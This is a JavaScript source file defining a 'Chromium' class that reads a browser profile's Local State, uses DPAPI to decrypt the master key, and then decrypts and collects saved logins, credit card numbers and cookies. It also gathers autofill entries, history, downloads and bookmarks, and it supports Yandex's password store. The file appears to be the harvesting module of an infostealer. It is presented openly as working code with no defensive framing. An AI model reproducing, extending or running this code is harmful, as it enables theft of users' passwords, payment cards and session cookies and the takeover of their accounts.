const crypto = require('crypto');
const path = require("path");
const fs = require("fs");

const query = require("./query.js");
const cryptofy = require("./cryptofy.js");

const structures = require("./structures");

class Chromium {
    Decrypt = (encryptedPass, masterKey) => {
        if (masterKey.length === 0) {
            return cryptofy.DPAPI(encryptedPass, null, 'CurrentUser');
        }

        const bufferKey = Buffer.isBuffer(masterKey) ? masterKey : Buffer.from(masterKey, 'utf-8');
        if (bufferKey.length !== 32) {
            throw new Error("Key must be 32 bytes for AES-256");
        };

        const nonce = encryptedPass.slice(3, 15);
        const encryptedData = encryptedPass.slice(15, -16);
        const authTag = encryptedPass.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', bufferKey, nonce);
        decipher.setAuthTag(authTag);

        let decryptedString = decipher.update(encryptedData, 'base64', 'utf-8');
        decryptedString += decipher.final('utf-8');

        return decryptedString;
    };

    GetMasterKey = async (chromiumPath) => {
        const localStatePath = path.join(chromiumPath, 'Local State')
        if (!fs.existsSync(localStatePath)) return null;

        try {
            const data = fs.readFileSync(localStatePath, 'utf8');

            const parsedData = JSON.parse(data);
            const encryptedKey = parsedData.os_crypt.encrypted_key;

            if (!encryptedKey) {
                return null;
            };

            const decodedKeyBuffer = Buffer.from(encryptedKey, 'base64');
            const slicedKeyBuffer = decodedKeyBuffer.slice(5);
            const decryptedKey = cryptofy.DPAPI(slicedKeyBuffer, null, 'CurrentUser');

            return decryptedKey;
        } catch (error) {
            console.error(error);
        }
    };

    GetDownloads = async (chromiumPathProfile) => {
        const HistoryFilePath = path.join(chromiumPathProfile, 'History');
        if (!fs.existsSync(HistoryFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(HistoryFilePath);

        try {
            const rows = await sqliteQuery.Execute('SELECT * FROM downloads');

            return rows.map(({ tab_url, target_path, total_bytes }) => {
                return new structures.Download(
                    tab_url,
                    target_path,
                    total_bytes
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetHistorys = async (chromiumPathProfile) => {
        const HistoryFilePath = path.join(chromiumPathProfile, 'History');
        if (!fs.existsSync(HistoryFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(HistoryFilePath);

        try {
            const rows = await sqliteQuery.Execute('SELECT * FROM urls');

            return rows.map(({ url, title, visit_count, last_visit_time }) => {
                return new structures.History(
                    url,
                    title,
                    visit_count,
                    last_visit_time
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetBookmarks = async (chromiumPathProfile) => {
        const BookmarksFilePath = path.join(chromiumPathProfile, 'Bookmarks');
        if (!fs.existsSync(BookmarksFilePath)) return [];

        const BookmarksFileTempPath = path.join(chromiumPathProfile, 'Bookmarks.temp');

        try {
            fs.copyFileSync(BookmarksFilePath, BookmarksFileTempPath);
            const bookmarksObjectJson = JSON.parse(fs.readFileSync(BookmarksFileTempPath, 'utf8'));

            return bookmarksObjectJson?.roots?.bookmark_bar?.children.map(({ url, name, date_added }) => {
                return new structures.Bookmark(
                    url,
                    name,
                    date_added
                )
            });
        } catch (error) {
            return [];
        } finally {
            if (fs.existsSync(BookmarksFileTempPath)) {
                try {
                    fs.unlinkSync(BookmarksFileTempPath);
                } catch (error) {
                }
            }
        }
    };

    GetAutofills = async (chromiumPathProfile) => {
        const WebDataFilePath = path.join(chromiumPathProfile, 'Web Data');
        if (!fs.existsSync(WebDataFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(WebDataFilePath);

        try {
            const rows = await sqliteQuery.Execute('SELECT * FROM autofill');

            return rows.map(({ name, value }) => {
                return new structures.Autofill(
                    name,
                    value
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetLogins = async (chromiumPathProfile, masterKey) => {
        const LoginDataFilePath = chromiumPathProfile.includes("Yandex")
            ? path.join(chromiumPathProfile, 'Ya Passman Data')
            : path.join(chromiumPathProfile, 'Login Data');
        if (!fs.existsSync(LoginDataFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(LoginDataFilePath);

        try {
            const rows = await sqliteQuery.Execute('SELECT * FROM logins');

            return rows.map(({ password_value, username_value, origin_url, date_created }) => {
                let password = password_value;

                try {
                    if (password) {
                        password = this.Decrypt(password, masterKey);
                    };

                    if (username_value && password) {
                        structures.BrowserStatistics.addSites({
                            source: 'logins',
                            origin_url: origin_url
                        });

                        return new structures.Login(
                            origin_url,
                            username_value,
                            password,
                            date_created
                        );
                    }
                } catch (error) {
                    return null;
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetCreditCards = async (chromiumPathProfile, masterKey) => {
        const WebDataFilePath = path.join(chromiumPathProfile, 'Web Data');
        if (!fs.existsSync(WebDataFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(WebDataFilePath);

        try {
            const rows = await sqliteQuery.Execute('SELECT * FROM credit_cards');

            return rows.map(({ card_number_encrypted, guid, name_on_card, billing_address_id, nickname, expiration_month, expiration_year }) => {
                let card_number = card_number_encrypted;

                try {
                    if (card_number) {
                        card_number = this.Decrypt(card_number, masterKey);
                    };

                    return new structures.CreditCard(
                        guid,
                        name_on_card,
                        card_number,
                        billing_address_id,
                        nickname,
                        expiration_month,
                        expiration_year
                    );
                } catch (error) {
                    return null;
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetCookies = async (chromiumPathProfile, masterKey) => {
        const CookiesFilePath = path.join(chromiumPathProfile, 'Network', 'Cookies');
        if (!fs.existsSync(CookiesFilePath)) return [];

        const sqliteQuery = new query.SqliteQuery(CookiesFilePath);

        try {
            const rows = await sqliteQuery.Execute('SELECT * FROM cookies');

            return rows.map(({ encrypted_value, host_key, path, is_secure, expires_utc, name }) => {
                let cookies = encrypted_value;

                try {
                    if (cookies) {
                        cookies = this.Decrypt(cookies, masterKey);
                    };

                    structures.BrowserStatistics.AddSites({
                        source: 'cookies',
                        origin_url: host_key
                    });

                    structures.BrowserStatistics.AddCookies({
                        host_key: host_key,
                        path: path,
                        is_secure: is_secure,
                        expires_utc: expires_utc,
                        name: name,
                        value: cookies
                    });

                    return new structures.Cookie(
                        host_key,
                        path,
                        is_secure,
                        expires_utc,
                        name,
                        cookies
                    );
                } catch (error) {
                    return null;
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };
};

module.exports = {
    Chromium,
};